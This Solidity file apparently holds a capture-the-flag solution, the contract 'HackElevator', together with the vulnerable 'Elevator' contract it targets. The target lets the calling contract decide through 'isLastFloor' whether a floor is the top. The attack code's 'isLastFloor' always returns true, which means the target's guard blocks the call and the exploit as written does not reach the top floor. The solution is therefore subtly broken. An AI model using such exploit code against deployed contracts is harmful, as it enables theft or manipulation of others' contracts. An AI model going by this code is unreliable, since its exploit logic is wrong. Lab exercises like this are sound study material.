// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Elevator.sol';

contract HackElevator is Building {
  // Complete with the instance's address
  Elevator public originalContract = Elevator(0xEa94eede078e8d6dcfCD1D0BBE479dE37dbbeb19); 

  function hack() public {
      originalContract.goTo(1);
  }

  function isLastFloor(uint) public virtual override returns (bool) {
    return true;
  }

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}